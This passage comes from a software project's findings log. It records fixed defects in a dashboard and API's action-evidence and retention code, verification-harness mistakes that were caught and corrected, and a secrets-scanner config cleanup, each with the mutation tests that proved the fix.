  finding that survives the blocker's fix, and the reason the suite was rebuilt rather than
  repaired). The two headline cases made their point with a CROSS-USER fixture: a same-org peer must
  not receive the owner's private-action sample. Against an owner-keyed store the store refuses that
  one layer down, so once the owner term was threaded the visible-action filter could be DELETED with
  the suite green - measured. The filter's case is now SAME-OWNER: one owner, two rows of their own,
  a package carrying only one of the two actions, with a control seeding the identical rows against
  the wide package so the withheld row is provably reachable. The divergent-resolution scenario stays
  as the OWNER-term regression, with the peer holding a row of their own so their answer is "theirs"
  rather than "nothing".
  PROVEN BY MUTATION: deleting `visible.has(row.actionName)` reds exactly those two cases.

- **`s2-fetchsteps-and-fetchruns-had-no-stale-key-guard`** (**FIXED 2026-08-22**, MAJOR, F2/F8).
  `load` and `fetchEvidence` re-check `requestedKey` after their await; `fetchSteps` and `fetchRuns`
  did not, and their state maps are keyed by ACTION NAME while the unit of the decision is
  `(integrationKey, actionName)`. Two integrations routinely declare the same action name, so a slow
  answer for integration A's `consultar_processo` commits under integration B's - and it STICKS,
  because the component's lazy effect only fetches a section still UNSET and `reset()` cannot cancel
  a promise. `runNow`'s post-success `fetchRuns` had the same hole. Both capture the key at dispatch
  and drop a late answer now.
  PROVEN BY MUTATION: removing the guard from `fetchSteps` reds 2, from `fetchRuns` reds 1.

- **`s2-evidence-step-samples-were-joined-by-index-onto-whatever-plan-is-bound-today`**
  (**FIXED 2026-08-22**, MAJOR, F3). The sample's steps were laid over the fetched plan purely by
  `stepIndex`, with no check that the evidence run executed THAT plan. The sample's unit is
  `(runId, stepIndex)` of the plan as it was when the run happened; the plan on screen is the one the
  binding names TODAY. Editing the bound automation on `/automations` moves neither the binding nor
  `actionShape` (which fingerprints the binding, not the steps), so `staleEvidence` stayed false and
  an old run's step-3 screenshot rendered inline under a new, different step 3 - presented as that
  step's evidence, with no signal at all. FIXED with an explicit gate (`stepSampleFit`) on the
  strongest identity the data carries, which is the RUN: the row's `runId` found in the history
  fetched for THIS automation proves the run executed this automation. Nothing carries a plan hash -
  not `RunRecord`, not the row - so run identity is the ceiling and the code says so. Where it cannot
  be established the samples join only if they still ADDRESS these steps (every index in range,
  lengths agreeing or the sample flagged a truncated prefix) and the page says they may be from an
  earlier version of these steps; where they do not, nothing joins, because a partial join is the
  same misalignment with fewer symptoms.
  PROVEN BY MUTATION: joining regardless of the verdict reds the out-of-range case.

- **`s2-no-e2e-spec-for-the-new-detail-surface`** (**FIXED 2026-08-22**, MAJOR, F9). A new
  user-visible dashboard surface landed with no Playwright spec, and the commit message said so
  rather than recording a dismissal here - which the QA process allows under neither reading. The two
  vitest halves mock the typed client, so they prove the rendering rules and cannot see that the list
  card's anchor routes here, that the four reads reach endpoints that answer at all, or that the
  dashboard takes no console error while it does. `web/e2e/integration-detail.spec.ts` covers the
  list-to-detail anchor, the actions list with both action shapes, one action opened with its request
  template, every fetching section SETTLED, and the `?action=` deep link - on the shipped `slack`
  package, read-only, LLM-free, registered in `SUITE_LEDGER.json` band 4.

- **`s2-the-stale-shape-warning-survived-its-always-on-mutant`** (**FIXED 2026-08-22**, MAJOR, F21).
  The rule was pinned in the positive direction only, so widening it to
  `evidence?.shape !== undefined` - every healthy sample flagged as recorded-before-the-edit, a
  user-visible lie about every action that ever ran - left all 29 web cases green. The ledger's "17
  mutants and no survivor" was true of the 17 chosen mutants and of nothing else. The negative case
  (matching shape must NOT warn, with a non-vacuous control that the sample rendered) is added; that
  mutant now reds 2.

- **`s2-schedules-counted-one-target-kind-while-history-counted-the-other`** (**FIXED 2026-08-22**,
  MINOR, F4). The section kept only `kind: 'integration_action'` rows, but a `kind: 'automation'`
  schedule aimed at the action's bound automation fires the very runs the same page's history
  attributes to the action - so "Esta ação não está agendada." was rendered over an action that runs
  every morning. Both kinds count now, which is what the page's own copy claims.

- **`s2-evidence-and-schedules-failures-had-no-retry`** (**FIXED 2026-08-22**, MINOR, F10). The
  component header promised "a failed read says so and offers a retry" for its fetching sections and
  two of the four shipped without one, leaving a full page reload as the only recovery. Both carry it
  now - the samples through the store, the schedules through the page that owns the list.

- **`s2-store-invented-portuguese-copy-and-leaked-a-machine-token-to-a-toast`**
  (**FIXED 2026-08-22**, MINOR, F11). Four hardcoded PT fallbacks meant an en-locale user saw
  Portuguese on any error whose envelope message was empty, and `result.error || result.code || ...`
  put the executor's own outcome token (`upstream_error`) into `toast.error` as if it were an
  explanation. The store now carries the FACT plus at most the server's own prose and hands the code
  over as `errorCode`; the page translates it through a new `runCodes` table (en/pt/types in
  lockstep) and falls back to the generic sentence for a token nobody has copy for. The posture
  `shared/src/run-errors.ts` established for run errors, applied to the executor's vocabulary.

- **`s2-action-deep-link-was-read-only-at-mount`** (**FIXED 2026-08-22**, MINOR, F12). `?action=` was
  read once into `useState`, so an in-app navigation from `?action=a` to `?action=b` - same route, no
  remount - left the previous action expanded and the link the user had just followed did nothing,
  which is precisely the case the param exists for. Synced on change, and only on change, so a
  manually opened panel is never undone by a re-render.

- **`s2-run-row-with-neither-stamp-rendered-a-blank`** (**FIXED 2026-08-22**, MINOR, F13). A queued
  run has neither `startedAt` nor `finishedAt`, and `formatStamp` answers `''` for an absent one, so
  the row rendered a gap beside a badge saying the run is queued. It says "Ainda não começou" now.

- **`s2-no-wire-level-403-envelope-case-for-the-new-endpoint`** (**FIXED 2026-08-22**, MINOR, F16).
  `GET /:key/evidence` can answer 403 (`refuseCapability` maps the view's `no_tenant` to FORBIDDEN)
  and the contract suite validated the envelope for 401/400/404 only, with the refusal pinned at
  module level where it cannot see a status code, an envelope, or that the route reaches
  `refuseCapability` at all. The wire case is added, and the resolution-gate mutation now reds it
  alongside the module-level ones.

## Recently fixed - 2026-08-22 the estate verification could not fail, twice over

- **`estate-run-raced-its-own-build-and-the-tail-swallowed-the-red`** (**FIXED 2026-08-22**, MEDIUM,
  process - the verification harness, not the product; self-reported by the session that did it,
  sibling of `workspace-scoped-verification-misses-two-workspaces`). Three interlocking measurement
  defects in how the S6 and S4/S5 pre-merge estates were run, each individually able to pass a red
  estate, jointly used to merge S6:

  **(a) THE ESTATE RACED ITS OWN BUILD.** The five-workspace `npm test` and a `npm run build`-first
  gates lane were launched CONCURRENTLY in the same worktree, so the api suite could read a
  `shared/dist` that the gates lane was rebuilding underneath it. Observed directly on the S4/S5
  branch: the estate reported api RED (35 S6-suite failures) while the identical tree, re-run after
  the build had finished, was green everywhere - the red was the race, and a real red would have
  been indistinguishable from it. The same race ran under S6's estate.

  **(b) THE TAIL PIPE DESTROYED THE FAILURE SIGNAL.** `npm test 2>&1 | tail -N`: the pipeline exit
  is tail's (no pipefail in this shell), npm prints a workspace's failure block MID-STREAM
  immediately after that workspace, npm then CONTINUES into the remaining workspaces, and npm prints
  NO final aggregate error. So a red api produces a run whose last N lines are entirely passing
  output with "exit 0" - measured, not inferred: the S4/S5 estate's tail showed web, bridge and
  cortex-cli green over a red api. S6 was merged on exactly this evidence shape.

  **(c) THE ABORT-ON-FAILURE INFERENCE WAS FALSE.** The S6 merge decision rested on "the workspace
  fan-out aborts on the first failure, cortex-cli ran last and passed, therefore everything before
  it passed". `npm run test --workspaces` does not abort; (b)'s run proves it continuing straight
  through a failed api into three more green workspaces.

  **GROUND TRUTH RESTORED before anything further merged:** the post-S6, post-S4/S5 tree (ff2a109)
  re-verified with builds SEQUENCED before tests and every run's full output kept to a file with its
  own exit code echoed - api green in two runs covering every test dir (2472 + 3080 tests), shared
  127, web 559, bridge 527, cortex-cli 111, all gates green. The stale-dist red first blamed on main
  reproduced the same 35 failures from the main checkout's own unrebuilt dist and disappeared on
  rebuild, which is `openapi-drift`'s "this gate reads dist, not src" doing its job.
  **RULES:** never run the estate concurrently with a build over the same tree; never let
  verification evidence pass through `| tail`/`| grep` without the full stream preserved and the
  producer's own exit code captured; never infer a workspace's result from a later workspace's.

## Recently fixed - 2026-08-22 the secrets gate stops arguing against itself

- **`gitleaks-path-allowlists-contradicted-their-own-config`** (**FIXED 2026-08-22**, MEDIUM,
  S6 review blocker 1b). `scripts/gitleaks.toml` allowlisted `spec/.*`, `docs/.*`, `.*\.example\..*`,
  and `api/test/fake-daemon/fixtures/.*` by PATH, fifteen lines above its own comment explaining why
  value allowlists beat path allowlists: a path allowlist *"would blind the scanner to a REAL token
  pasted into a test file, which is a normal way credentials escape"*. Every argument in that comment
  applied verbatim to the four path entries - docs/ is where evidence captures, runbooks, and pasted
  terminal output land, which is exactly where a real token escapes to. **Measured before fixing**
  (2026-08-22): the four path entries together masked exactly FOUR findings, all in the retired
  `docs/release/evidence/` J-run tree, history-only (the tree is gone from the working tree), and all
  dead - an `EKOA_LLM_DIRECT=1` env-flag false positive twice, a webhook secret minted by a local
  ephemeral J-run stack, and a super-admin JWT signed with the dev-only secret that expired 2026-01.
  The `spec/.*`, `.*\.example\..*`, and `fake-daemon` entries masked NOTHING. **FIX:** the paths
  section is deleted outright; the four historical values are enumerated in the value allowlist (the
  JWT by its signature segment, which is unique to that token - allowlisting the shared HS256 header
  prefix would blind the scanner to every future dev JWT). Mutation-tested: a planted
  `sk-ant-`-shaped literal under `docs/` now trips the scanner; before the fix it could not.

- **`secret-shaped-fixture-skipped-the-convention-and-held-the-gate-red`** (**FIXED 2026-08-22**,
  LOW, process). `api/tests/automation/discovery-replay-acceptance.test.ts` (commit `c43a190`, P2
  round eight) introduced a deliberately secret-shaped `__VIEWSTATE` miniature - the suite needs a
  value `looksLikeLiteralSecret` refuses, to prove the recipe store throws rather than persist it -
  without the `EKOA-SYNTHETIC-` marker the gitleaks config's own convention prescribes for exactly
  this case, and without a value-allowlist entry. `npm run gate:secrets` was red from `c43a190`
  until today, the "already-failing check receives a real leak invisibly" state the
  `gitleaks-red-on-synthetic-fixtures` entry (2026-07-29) named as the reason the gate must stay
  green. It went unnoticed because that gate is not in the per-PR lane. **FIX:** the working-tree
  fixture now carries `EKOA-SYNTHETIC-` (still >=24 chars, three character classes, so the predicate
  still refuses it - the suite's 13 tests stay green); the historical literal, reachable forever in
  `c43a190`, gets a one-off value entry with the reasoning inline. Gate green at zero findings.

## Recently fixed - 2026-08-21 action evidence round NINE (one major + three minors)

- **`the-90-day-bound-was-contingent-on-somebody-deploying`** (**FIXED 2026-08-21**, S1 round nine,
  **MAJOR** - a retention bound with no trigger, and five documents asserting it as enforced. Created
  BY round five's simplification and made invisible BY round six's fix, so it is logged as a
  compounding error rather than as a discovery).

  **WHAT WAS TRUE.** `sweepExpiredEvidence` had exactly one caller chain in the estate:
  `sweepScreenshotsSparingPinnedEvidence` -> `bootState` -> `boot()`. No `setInterval`, no Mongo TTL
  index anywhere in the repo - in a process that already runs THREE interval rails (the listener
  supervisor, the knowledge scheduler, the schedule supervisor). Deployment reality:
  `deploy/staging/docker-compose.yml` is `restart: unless-stopped` and `deploy/api.service.json` is a
  long-lived container over a persistent volume. **An api container that runs six months without a
  deploy retained EVERY evidence row for six months** - a durable capped copy of one person's real
  third-party request and response, client names, processo numbers, invoice totals - and every
  automation-backed row kept its `pinnedRunIds` exemption for six months with it, so the per-step PNGs
  of authenticated client-portal sessions survived the 7-day screenshot sweep for six months too, with
  no erasure path over that tree at all (`screenshot-erasure-path-has-no-production-caller`, OPEN).

  **HOW IT GOT THERE, RECORDED AS COMPOUNDING RATHER THAN AS ONE MISTAKE.** Round five removed every
  synchronous collector on the strength of *"TTL is the collector"* - without checking that the TTL
  fires on a schedule. It fired at boot. Round six then enforced the CONSTANT (90 -> 89 and 90 -> 91
  both redden) and not the TRIGGER, which made the gap harder to see rather than easier: the estate
  was green over a bound that could not fire. Five places then stated it as enforced - the store
  header, `EVIDENCE_RETENTION_DAYS`'s docblock, `data/stores.ts`, `docs/architecture.md`,
  `docs/findings.md` (*"THE 'AT MOST 90 DAYS' BOUND IS NOW ENFORCED"*), plus
  `shared/src/integrations.ts`, the shipped contract file. **Enforcing a number nothing fires is
  enforcing nothing.**

  **THE SAME ONE-SHOT SILENTLY BACKSTOPPED THE DISCONNECT ERASURE.**
  `discardEvidenceOfDisconnectedConfig` catches everything, returns 0 and warns; nothing retries it.
  The only thing that ever reached those leftover rows again was this sweep, so a
  credential-disconnect erasure that hit a Mongo blip had no bounded backstop either. Now bounded at
  the same window plus one tick, and said so in its docblock.

  **THE FIX IS A TRIGGER.** `startRetentionSweepRail` (`api/src/server.ts`): an unref'd
  `RETENTION_SWEEP_INTERVAL_MS` (6h) interval re-entering `sweepScreenshotsSparingPinnedEvidence`,
  armed by `bootState` immediately after the one-shot (so the first tick cannot race it) and disarmed
  on shutdown, re-entrancy-guarded so a tick landing on an in-flight pass answers `null` instead of
  racing it over the same tree. Armed from `bootState` and NOT `boot()`'s post-listen block, unlike
  the other three rails: it has no HTTP-listener dependency, and `boot()` is entered by no test in
  this repo - the exact defect class this slice already hit once.

  **NOT A MONGO TTL INDEX**, and the three reasons are in the function's docblock: an index collects
  only the row and leaves the SCREENSHOTS, which are a filesystem walk in this process needing a
  trigger regardless; it takes the evidence-before-pins ordering out of this process's hands; and
  `validatedAt` is an ISO-8601 STRING by design (it orders lexicographically, which is what makes the
  cutoff one `deleteMany` with no materialisation) while a TTL index needs a BSON `Date` - so an index
  means changing the stored type or carrying a permanent parallel field, which CLAUDE.md rule 10
  forbids.

  **PINNED BY A TICK, NOT BY A CONSTANT** - `the retention rail` in
  `api/tests/automation/composition-root-screenshot-pins.test.ts`, three cases. (1) Enters the REAL
  `bootState`, asserts the rail is armed and `hasRef() === false`, then expires a row AFTER boot
  (asserting the un-swept state first, as the control) and waits for a tick to collect it and release
  its screenshot pin - collection with NO restart, which is the whole claim. (2) Arms with NO interval
  argument (production's exact call) under fake timers and straddles `6 * 60 * 60 * 1000` by one
  millisecond, restated as a literal. (3) Two overlapping ticks: peak concurrency 1 and the second
  answers `null`.

  **MUTATION-VERIFIED, all restored byte-identical:** arming nothing (the pre-round-nine behaviour)
  reddens 2; dropping `timer.unref?.()` reddens 1; 6h -> 5h reddens 1 and 6h -> 7h reddens 1 (both
  ways); removing `startRetentionSweepRail` from `bootState` reddens 1; removing the re-entrancy guard
  reddens 1.

  **AND EVERY CLAIM WAS CORRECTED TO WHAT IS ACTUALLY ENFORCED**: the bound is written as
  *"`EVIDENCE_RETENTION_DAYS` plus at most one `RETENTION_SWEEP_INTERVAL_MS`"* in the store header,
  the constant's docblock, `sweepExpiredEvidence`, `discardEvidenceOfDisconnectedConfig`,
  `data/stores.ts`, `definition-store.ts`, `screenshot-plane.ts`, `shared/src/integrations.ts`,
  `docs/architecture.md` and this file - including the paragraph above that claimed it was enforced.

- **`the-migrated-row-sweep-was-logged-closed-without-being-grepped`** (**FIXED 2026-08-21**, S1
  round nine, **MINOR** - a retired claim surviving in a TEST NAME, in the file that states it most
  strongly, one round after the sweep for it was logged CLOSED).

  Round eight corrected the provenance of the owner-less evidence row - this collection HAS NEVER
  SHIPPED, the org-only key was an earlier round of this same unmerged branch, so no deployment holds
  a pre-owner row and nothing migrated anything - in `action-evidence-store.ts` and in
  `tests/integrations/action-evidence-removal.test.ts`, and recorded the sweep as complete. It had not
  grepped. `api/tests/security/action-evidence-isolation.test.ts` still carried it in its header
  (twice), in two inline comments, and **in a test NAME**: *"a PRE-OWNER migrated row … is served to
  nobody"*, whose body said *"The exact document the first cut of this collection wrote"*. The removal
  suite's own case name and fixture id (`migrated-org-only-key`) had survived the round-eight fix too,
  and `service.ts` cited that name.

  **THE COST IS SPECIFIC**: a maintainer greps "migrated", lands on a test name asserting that a
  deployment holds pre-owner rows, and plans a data migration for a collection that has never
  shipped - the exact mistake round eight logged as CLOSED. Renamed to *"an OWNERLESS row"* in both
  suites, fixture id and cross-reference updated, and the header now states the provenance, the fact
  that the defence is unchanged and still worth having, and why a wrong provenance in a test NAME is
  the kind that gets acted on. **The rule: a claim-retirement sweep is not complete until it has been
  grepped, including test names and fixture identifiers.** The same pass also retired a second stale
  claim in that header - `listOwnerRefsForKey` listed as a live cross-tenant reader "since round
  three", deleted in round four along with its round-five successor `listOwnerRefsInOrg`.

- **`three-docblocks-said-a-human-reads-a-row-nobody-renders`** (**FIXED 2026-08-21**, S1 round nine,
  **MINOR**, documentation-only). *"That row is what a person reads before granting trusted"*,
  *"the human's basis for granting `trusted`"* (twice) and *"the question the detail page asks"* were
  asserted at the three points the claim is MADE, while the caveat that no such reader exists lived in
  two other places entirely (`listForIntegration`'s docblock and `EVIDENCE_RETENTION_DAYS`'s). On this
  branch: `listForIntegration` has no production caller; the one production read is
  `trustAuthoredAction` handing the row to `promoteToTrusted`, which reads `outcome` and `shape` and
  renders nothing; and the person granting `trusted` echoes back a `shape` STRING. The caveat is now
  at each site that makes the claim - the store's module header, `AutomationEvidence.truncated`,
  `CollectedRunEvidence.truncated`, `data/stores.ts` and `docs/architecture.md` - saying that the
  caps, flags and pointers are correctness for the reader who is COMING, with an instruction to delete
  the paragraphs when the page mounts.

- **`two-literals-under-a-docblock-promising-they-could-not-drift`** (**FIXED 2026-08-21**, S1 round
  nine, **MINOR**). `MAX_EVIDENCE_EXCERPT_CHARS`'s docblock said the executor's response cap was
  *"stated once here so the success sample and the failure dump cannot drift into showing a person two
  different amounts of the same body"*. It was stated twice: two independent `8_000` literals, in two
  files, with nothing tying them - and mutating either alone left the whole estate green, because the
  only case that touched the cap compared the stored body against the STORE's constant and could never
  see the executor's. Closed by making the claim true - `const MAX_BODY_DISPLAY_BYTES =
  MAX_EVIDENCE_EXCERPT_CHARS` in `action-executor.ts` - and pinning it BEHAVIOURALLY rather than by
  comparing the two constants (which is a tautology over any pair of equal numbers): `the failure dump
  and the success sample cut the same body at the same point` drives one oversized body through the
  real executor twice, 2xx and 5xx, strips `truncateForDisplay`'s marker from the dump and asserts the
  remaining body bytes are exactly what the stored sample shows. **Measured both ways**: executor cap
  larger (`+ 1_000`) reddens, executor cap smaller (`111`) reddens, and re-splitting to a bare `8_000`
  stays green - correctly, because that is not a drift; re-splitting AND moving the store's constant to
  111 reddens, which is what proves the tie is load-bearing rather than an equivalent mutant. The VALUE
  8_000 stays pinned separately as a literal in `action-evidence.test.ts`.

## Recently fixed - 2026-08-21 action evidence round EIGHT (one major + three minors)

The S1 verification pass repeated a seventh time. Its finding is a property pinned three ways on one
rail and zero ways on the other, and a graduation gate that turned out to rest on the unpinned half.

- **`a-failed-automation-run-could-supersede-the-last-good-sample-and-nothing-noticed`**
  (**FIXED 2026-08-21**, S1 round eight, **MAJOR** - the guard was real, load-bearing in production,
  and pinned by nothing; and the gate that matters most rested on it).

  **THE MUTANT, MEASURED TWICE.** Delete `if (!automationResult.success) return null;` from the
  evidence build closure in `api/src/integrations/action-executor.ts` and the entire S1 estate stays
  green: 14 files, 258/258.

  **WHY THE LINE IS LOAD-BEARING.** `runAutomationForAction` answers a failed ENGINE run with
  `{success: false, code: 'automation_failed', data: {runId, status}}`, and that run id is REAL - a
  genuine `automationRuns` document with the failed trace and its screenshots behind it. Without the
  line `runIdOf` resolves it, `collectRunEvidence` returns the FAILED trace, and `recordEvidence`
  PUTs it at the same deterministic `_id`: the last SUCCESSFUL sample is superseded by a failure,
  stamped `validatedAt: now`, and the failed run's screenshots are pinned out of the 7-day sweep by
  the same write.

  **WHY NOTHING NOTICED.** The only suite binding the real evidence seams
  (`tests/automation/composition-root-action-seam.test.ts`) points its binding at `auto-never-runs`,
  an automation that does not exist. That refusal is `unknown_automation`, it carries **no `data`**,
  `runIdOf` answers `undefined`, and the mutant is a no-op there. Meanwhile the api-call half of the
  identical property was pinned THREE ways in `tests/integrations/action-evidence-capture.test.ts`
  ("a 4xx records nothing at all", "a failing run does NOT replace the evidence of the last
  successful one", "a transport error records nothing"). The automation half was pinned zero ways.

  **AND IT WAS WORSE THAN A COVERAGE GAP.** `promoteToTrusted` / `ValidatedRunEvidence` read PRESENCE
  plus `shape` and carried **no success signal at all**, so the graduation gate - the thing that makes
  an action auto-runnable by `achieve` - rested entirely on that one unpinned line. A gate that
  depends on a guard living inside the thing it gates is not a gate.

  **CLOSED IN BOTH HALVES.** (1) `tests/integrations/action-evidence-capture.test.ts` gains the
  automation rail: a REAL automation owned by the caller, driven to `automation_failed` through the
  PRODUCTION seam mapping (`automationBackedActionHandler`) with the real collector and the real
  store bound, the run record written through the production writer (`automationRunStore.create` then
  `update`, the pair `runOrRehearse` makes), asserting the previous successful row survives
  **byte-for-byte** (deep equality, so `validatedAt` and the pin are covered too) and that the failed
  run's screenshots were never pinned. (2) `ActionEvidenceDoc.outcome` is a `'succeeded' | 'failed'`
  term **DERIVED IN THE STORE** from the stored sample (2xx window for `api-call`; `RunStatus`'s one
  success member `completed` for `automation`; absent status is `failed`, fail-closed), and
  `promoteToTrusted` refuses anything but `succeeded`. Derived rather than carried on purpose: a term
  the executor passed in would restate the write site's own belief, and the gate would be exactly as
  dependent as before.

  **MUTANTS.** Deleting the executor guard reddens 2 (both new automation cases); deleting the
  promotion's outcome check reddens 4 across 3 suites; `outcome: outcomeOf(evidence)` ->
  `outcome: 'succeeded'` reddens 4 including the end-to-end achieve case; the 2xx window mutated at
  BOTH bounds (200 -> 199, 300 -> 301) reddens the edge case each way; the automation branch forced
  to `'succeeded'` reddens 1. Each restored, `git diff` clean.

- **`the-retention-claim-was-false-for-the-rail-the-platform-is-built-around`**
  (**FIXED 2026-08-21** as a CLAIM; the underlying gap is OPEN as
  `evidence-of-a-replaying-action-ages-out-while-the-action-is-in-daily-use`, S1 round eight,
  **MINOR**). `EVIDENCE_RETENTION_DAYS`'s docblock said every successful run rewrites `validatedAt`,
  so an integration in real use never ages out. A `browser-steps` READ action is `storable`, so after
  its first pass every later run REPLAYS and the collector answers null by construction - the stamp
  is never refreshed. The docblock now says which paths refresh and which do not, and names exactly
  what would have to change (a re-stamp operation called from the replay leg) for the retired
  sentence to become true. The over-broad control comment in
  `tests/integrations/action-evidence-removal.test.ts` is narrowed to the rail it actually exercises.

- **`the-org-shared-erasure-rationale-asserted-an-invariant-the-code-does-not-have`**
  (**FIXED 2026-08-21** as a CLAIM; the underlying gap is OPEN as
  `evidence-of-a-shared-credential-survives-its-disconnection`, S1 round eight, **MINOR**).
  `DisconnectedConfigScope`'s docblock claimed a member holding their own config never resolved the
  deleted org-shared row. Under ordering they may have: run under the shared credential, connect your
  own later, and your row - holding the shared account's data - is spared when the shared credential
  is disconnected. The docblock now states what the code actually guarantees (a statement about who
  would resolve the row NOW, not about whose account the sample holds), names the ordering, and
  records that it errs towards retaining and is bounded.

- **`two-disclosure-items-a-future-round-would-otherwise-rediscover`** (**FIXED 2026-08-21**, S1 round
  eight, **MINOR**, both raised by the verifier and both recorded in place rather than in a document
  nobody reads next to the code). (1) `capEvidence`'s per-STEP `|| step.truncated` disjunct is an
  EQUIVALENT MUTANT - `...step` has already spread the incoming flag through, so deleting it changes
  no stored byte for any input and no test can kill it. It is now labelled as one, so it is not
  mistaken for the carrier the way the RUN-level disjunct was for six rounds. (2) The "MIGRATED row"
  fixture in `tests/integrations/action-evidence-removal.test.ts` described a migration that cannot
  have happened: this collection has never shipped, and the org-only key was an earlier round of the
  same unmerged branch. The provenance is corrected in the fixture and in the two places in `api/src`
  that echoed it; the shape is still defended, for the honest reason (a hand-written row, a partial
  restore, or a future writer).

## Recently fixed - 2026-08-21 action evidence round SEVEN (one major + three minors)

The S1 verification pass repeated a sixth time. Its finding is a claim three files made and the code
could not keep, kept plausible by a fixture the production writer cannot produce.

- **`the-step-cap-cut-every-trace-silently-and-the-flag-could-not-fire`** (**FIXED 2026-08-21**, S1
  round seven, **MAJOR** - durable evidence that a human reads before granting `trusted` was
  indistinguishable from complete evidence). Measured end to end through the real collector, the real
  store and real Mongo: a **200-step run stored `steps.length = 50` and `truncated = undefined`**,
  byte-indistinguishable from a complete 50-step run.

  **WHY IT COULD NOT FIRE.** The step cap is applied TWICE and both copies are 50.
  `collectRunEvidence` (`api/src/automation/action-evidence.ts`) does `run.steps.slice(0, MAX_STEPS)`
  and returned a `CollectedRunEvidence` with **no truncation field at all** - the interface declared
  only `{status?, steps[]}`, and the per-step `truncated` it does set is the EXCERPT flag, not the
  step-count flag. The executor forwarded that verbatim. `capEvidence` then tested
  `evidence.steps.length > MAX_EVIDENCE_STEPS || evidence.truncated`, and what it receives is
  **exactly 50**, so the first disjunct compares equal numbers and the second was never set. The
  disjunct was unreachable on the only path production takes.

  **THREE CLAIMS IT FALSIFIED**: `AutomationEvidence.truncated`'s docblock (*"True when the run had
  more steps than `MAX_EVIDENCE_STEPS`. Recorded, never silent."*), the store's own module promise
  (*"truncation is recorded and never silent"*), and the store suite's header (*"the caps are real …
  and truncation is RECORDED, never silent"*).

  **AND THE FIXTURE IS WHAT HID IT.** The case claiming to cover this hand-built a **62-step**
  evidence object and handed it to `recordEvidence` - a shape the production writer structurally
  cannot produce, since the collector slices to 50 before the seam. The automation-side case asserted
  the cut but no signal, because there was no field to assert.

  **WHY IT MATTERS BEYOND TIDINESS.** The row is durable for `EVIDENCE_RETENTION_DAYS` = 90 and is
  the human's basis for granting `trusted`, which makes an action auto-runnable by `achieve`. "These
  are the first 50 steps of a longer run" is part of what is being judged.

  **CLOSED BY CARRYING THE SIGNAL WITH THE SLICE**, because only the slicer can still see
  `run.steps.length`: `CollectedRunEvidence.truncated` is set in the same statement that slices;
  `RunEvidenceCollector` declares it; the executor's automation capture forwards it. `capEvidence`
  keeps both disjuncts, with the length test recorded as the module's OWN ceiling against a future
  caller that forgets to cap - unreachable from production, and said so rather than left looking like
  the mechanism. **Pinned end to end** in `tests/automation/composition-root-action-seam.test.ts`: a
  200-step `RunRecord` through the real collector, the real executor forward and the real store, plus
  a 50-step control that must carry no flag. Mutants: collector flag forced `false` reddens 3 across
  2 suites; `>` -> `>=` reddens 2; dropping the executor forward reddens **only** the end-to-end case
  (which is exactly the mutant six rounds of seam-local suites survived); dropping
  `|| evidence.truncated` reddens 2. Restored, `git diff` clean.

- **`the-screenshot-window-was-the-same-unpinned-number-one-tree-over`** (**FIXED 2026-08-21**, S1
  round seven, **MINOR**, exact mirror of round six's `EVIDENCE_RETENTION_DAYS` finding, in the
  sibling constant, inside the same boot sweep). `DEFAULT_SCREENSHOT_RETENTION_DAYS` was unenforced
  in **both** directions: 7 -> 36500 reddened nothing and 7 -> 1 reddened nothing (247/247 green).
  Both suites that touch the sweeper passed `retentionDays: 7` **explicitly**, while the one
  production caller - `sweepScreenshotsSparingPinnedEvidence` in `server.ts` - passes nothing and
  rides the default. So the only number production uses was the one nothing could fail for.
  Closed by restating 7 as a LITERAL in `screenshot retention (R-3)`
  (`api/tests/security/screenshot-plane.test.ts`), straddling the cutoff by HALF a day either side
  **with no `retentionDays` argument**; whole-day offsets let a 7 -> 6 mutant survive on the strict
  `<`. Measured: 7 -> 1 and 7 -> 36500 each redden exactly this case.

- **`the-screenshot-sweep-had-no-non-positive-guard-its-sibling-has`** (**FIXED 2026-08-21**, S1
  round seven, **MINOR**, same line, second half). `sweepExpiredScreenshots` had no
  `retentionDays <= 0` guard, so a 0, a negative or a `NaN` from a mis-parsed override put the cutoff
  at or after `now` and the next boot deleted **every unpinned run directory in the tree** - an
  unrecoverable erasure of authenticated client-portal screenshots triggered by a configuration slip.
  Its sibling `sweepExpiredEvidence` has had that guard all along and its suite pins it (*"a
  non-positive window sweeps NOTHING rather than everything"*). Guard and case mirrored; the case
  also asserts the dir that WOULD have gone at 7 days survives, so it cannot pass on a sweeper that
  had simply stopped finding anything. Measured: removing the guard reddens 1.

- **`deleteconfig-replaced-one-false-comment-with-another`** (**FIXED 2026-08-21**, S1 round seven,
  **MINOR**, documentation + one previously-unpinned behaviour). Round six's note claimed the
  exclusion-list filter *"keeps the list to owners who genuinely hold a row of their own, so a peer
  row carrying no custodian cannot land in the exclusion list and spare the very members the deleted
  credential served."* **No served member can ever be spared by that list**: a served member is by
  definition one holding no config row, so nothing contributes their id, and their evidence row
  carries their own real non-empty `ownerUserId`, which is never in the exclusion set. Measured on
  real Mongo - with the filter removed the served member's row is still deleted.

  What the filter actually keeps out is `undefined`, and the consequence runs the **other way**: an
  `undefined` inside `$nin` serialises to `null`, and `$nin: [null]` spares exactly the rows carrying
  **no** `ownerUserId` - the migrated rows from this collection's org-only first cut, which
  `discardEvidenceForDisconnectedConfig`'s own note says must go here because nothing can ever
  supersede them. So it protects a DELETION, not a sparing.

  **AND ITS RUNTIME EFFECT IS UNOBSERVABLE THROUGH `deleteConfig`, WHICH IS NOW SAID OUT LOUD RATHER
  THAN CLAIMED AWAY.** The only row that can contribute `undefined` is another custodian-less row for
  the same key, and every such row is itself in `writable`; its own iteration deletes it and then
  discards with a list that no longer contains it, so both orders converge on the same end state
  (measured both ways, two-shared-row and one-shared-row fixtures, through the real `createConfig`).
  The `id is string` narrowing is what `DisconnectedConfigScope`'s `readonly string[]` requires, so
  **`tsc`, not a test, is the enforcement** - deleting the filter outright fails
  `tsc --noEmit -p api/tsconfig.json` with TS2322 (verified). The filter is kept and relabelled
  rather than deleted, and the BEHAVIOUR it exists to keep true is now pinned end to end through the
  real `deleteConfig`: `a MIGRATED row carrying no owner goes when the shared credential that
  produced it is disconnected` in `api/tests/integrations/action-evidence-removal.test.ts`, with a
  peer holding their own credential and another tenant as controls. Mutant: adding `$exists: true` to
  the store's `$nin` arm - i.e. sparing rows with no owner - reddens exactly that case.

- **`the-retired-collector-claim-survived-in-three-more-live-places`** (**FIXED 2026-08-21**, S1
  round seven, **MINOR**, documentation-only; round six's sweep of the same claim reported itself
  complete). *"Collected when the action stops resolving"* - the mechanism round five DELETED -
  survived in the docblock on the **production DELETE handler** that mounts the very descriptor round
  six corrected (`api/src/routes/integrations.ts`), and in the same sentence in
  `api/tests/contract/integrations-achieve.test.ts`. Separately,
  `api/src/integrations/index.ts` still asserted in the present tense that *"the detail-page read and
